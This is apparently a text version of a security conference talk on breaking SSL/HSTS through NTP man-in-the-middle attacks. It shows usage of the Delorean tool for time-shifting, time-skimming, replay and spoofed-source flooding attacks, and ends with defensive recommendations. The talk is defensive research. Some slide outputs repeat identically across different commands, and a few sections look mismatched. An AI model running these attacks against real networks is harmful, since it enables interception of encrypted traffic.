# Breaking SSL using Time Synchronization Attacks

## Presenter
**Jose Selvi, Senior Security Consultant**
- **Experience:** Over 10 years in security
- **Role:** Senior Security Consultant
- **Certifications:** SANS Institute Community Instructor, GIAC Security Expert (GSE)
- **Social Media:** Twitter: [@JoseSelvi](https://twitter.com/JoseSelvi)
- **Blog:** [pentester.es](http://www.pentester.es)

## Introduction
- **Location:** Valencia, Spain
- **Note:** Presentation will be delivered with a Spanish accent
- **Let's Begin!**

## Agenda
1. Modern Time Synchronization
2. Get in a Delorean
3. HTTP Strict Transport Security
4. Windows Task Scheduler
5. Public Key Infrastructure
6. Conclusions & Recommendations

## Network Time Protocol (NTP)
- **Purpose:** Time Synchronization Services
- **Specifications:**
  - RFC 1305 (v3), RFC 5905 (v4), and RFC 4330 (SNTPv4)
- **Availability:** Default in almost all operating systems
- **Security Concerns:**
  - Not secured by default
  - Vulnerable to Man-in-the-Middle (MitM) attacks

### NTP Packet Example: Ubuntu Linux
- **Mac OS X - Mavericks:**
  - New synchronization service
  - NTP daemon exists but does not synchronize; it writes to `/var/db/ntp.drift`
  - A new service called "pacemaker" checks this file and adjusts the clock
  - It seems to have some issues

### Does NTP Work?
- **Mac OS X - Mavericks:**
  - Uses `/usr/libexec/ntpd-wrapper`
- **Fedora Linux:**
  - Easiest to configure
  - Uses NTPv3
  - Supports multiple NTP servers
  - Requests every minute
  - Example:
    ```bash
    $ tcpdump -i eth0 -nn src port 123
    12:43:50.614191 IP 192.168.1.101.123 > 89.248.106.98.123: NTPv3, Client, length 48
    12:44:55.696390 IP 192.168.1.101.123 > 213.194.159.3.123: NTPv3, Client, length 48
    12:45:59.034059 IP 192.168.1.101.123 > 89.248.106.98.123: NTPv3, Client, length 48
    ```

- **Ubuntu Linux:**
  - Simple configuration
  - Uses NTPv4
  - Synchronizes each time it connects to a network and at boot time
  - Configuration files in `/etc/network/if-up.d/`

- **Windows:**
  - Uses NTPv3
  - Most secure implementation
  - Synchronizes every 7 days
  - Drift of more than 15 hours is not allowed
  - Domain members work differently
  - W32time service with `Max[Pos|Neg]PhaseCorrection` settings

### What the Internet Says?
- **Manual Synchronization:**
  - Windows Domain Members
  - Uses `w32time` service for synchronization
  - Sign the NTP response with the `unicodePwd`

### Delorean
- **Description:**
  - NTP MitM Tool
  - Free and Open Source
  - Written in Python
  - Based on kimiflyâ€™s work
  - Implements several attacks
  - Pretends to be an NTP attack 'suite'
- **Usage:**
  ```bash
  $ ./delorean.py -h
  Usage: delorean.py [options]
  Options:
    -h, --help            show this help message and exit
    -i INTERFACE, --interface=INTERFACE
                          Listening interface
    -p PORT, --port=PORT  Listening port
    -n, --nobanner        Not show Delorean banner
    -s STEP, --force-step=STEP
                          Force the time step: 3m (minutes), 4d (days), 1M (month)
    -d DATE, --force-date=DATE
                          Force the date: YYYY-MM-DD hh:mm[:ss]
    -r, --random-date     Use random date each time
  ```

### Basic Attacks
- **Example Commands:**
  ```bash
  # ./delorean.py -n
  [22:02:57] Sent to 192.168.10.102:55962 - Going to the future! 2015-06-20 22:02
  [22:02:59] Sent to 192.168.10.102:39708 - Going to the future! 2015-06-20 22:02
  # ./delorean.py -d '2020-08-01' -n
  [22:02:57] Sent to 192.168.10.102:55962 - Going to the future! 2015-06-20 22:02
  [22:02:59] Sent to 192.168.10.102:39708 - Going to the future! 2015-06-20 22:02
  # ./delorean.py -r -n
  [22:02:57] Sent to 192.168.10.102:55962 - Going to the future! 2015-06-20 22:02
  [22:02:59] Sent to 192.168.10.102:39708 - Going to the future! 2015-06-20 22:02
  # ./delorean.py -s 10d -n
  [22:02:57] Sent to 192.168.10.102:55962 - Going to the future! 2015-06-20 22:02
  [22:02:59] Sent to 192.168.10.102:39708 - Going to the future! 2015-06-20 22:02
  ```

### Time Skimming Attack
- **Example:**
  ```bash
  # ./delorean.py -k 15h -t 10s -n
  [21:57:26] Sent to 192.168.10.105:123 - Going to the future! 2015-06-11 12:57
  [21:57:33] Sent to 192.168.10.105:123 - Going to the future! 2015-06-12 03:57
  [21:57:37] Sent to 192.168.10.105:123 - Going to the future! 2015-06-12 18:56
  [21:57:44] Sent to 192.168.10.105:123 - Going to the future! 2015-06-13 09:56
  [21:57:50] Sent to 192.168.10.105:123 - Going to the future! 2015-06-14 00:56
  [21:57:58] Sent to 192.168.10.105:123 - Going to the future! 2015-06-14 15:56
  [21:58:04] Sent to 192.168.10.105:123 - Going to the future! 2015-06-15 06:56
  [21:58:11] Sent to 192.168.10.105:123 - Going to the future! 2015-06-15 21:56
  [21:58:17] Sent to 192.168.10.105:123 - Going to the future! 2015-06-16 12:56
  ```

### Replay Attack
- **Example:**
  ```bash
  # ./delorean.py -n -r capture.pcap
  [06:19:13] Replayed to 192.168.10.105:39895 - Going to the past! 2015-06-24 21:41
  [06:19:17] Replayed to 192.168.10.105:39895 - Going to the past! 2015-06-24 21:41
  ```

### Spoofing Attack
- **Example:**
  ```bash
  # ./delorean.py -n -f 192.168.10.10 -o 8.8.8.8 -r capture.pcap
  Flooding to 192.168.10.10
  $ tcpdump -nn -p -i eth1 host 192.168.10.10
  tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
  listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
  08:26:07.621412 IP 8.8.8.8.123 > 192.168.10.10.123: NTPv4, Server, length 48
  08:26:07.682578 IP 8.8.8.8.123 > 192.168.10.10.123: NTPv4, Server, length 48
  08:26:07.761407 IP 8.8.8.8.123 > 192.168.10.10.123: NTPv4, Server, length 48
  08:26:07.766434 IP 8.8.8.8.123 > 192.168.10.10.123: NTPv4, Server, length 48
  08:26:07.843923 IP 8.8.8.8.123 > 192.168.10.10.123: NTPv4, Server, length 48
  08:26:07.905666 IP 8.8.8.8.123 > 192.168.10.10.123: NTPv4, Server, length 48
  08:26:07.922923 IP 8.8.8.8.123 > 192.168.10.10.123: NTPv4, Server, length 48
  ```

### Anti-Replaying
- **Preventive Measures:**
  - Implement strict security policies
  - Use authenticated NTP
  - Regularly update and patch systems

## Stripping SSL Links
- **Scenario:**
  - Attacker intercepts HTTPS traffic and downgrades it to HTTP
- **HTTP Strict Transport Security (HSTS):**
  - **RFC 6797:** Published on November 12
  - Also known as HSTS or STS
  - Prevents HTTP connections
  - Prevents accepting self-signed and rogue certificates
  - Uses a new "Strict-Transport-Security" header
- **Who Uses HSTS?**
  - Many major websites and services

## Conclusions & Recommendations
- **Conclusions:**
  - Time synchronization attacks can be used to break SSL
  - NTP is often unsecured and vulnerable to MitM attacks
- **Recommendations:**
  - Use authenticated NTP
  - Implement HSTS
  - Regularly update and patch systems
  - Educate users about the risks of unsecured time synchronization

Thank you for your attention!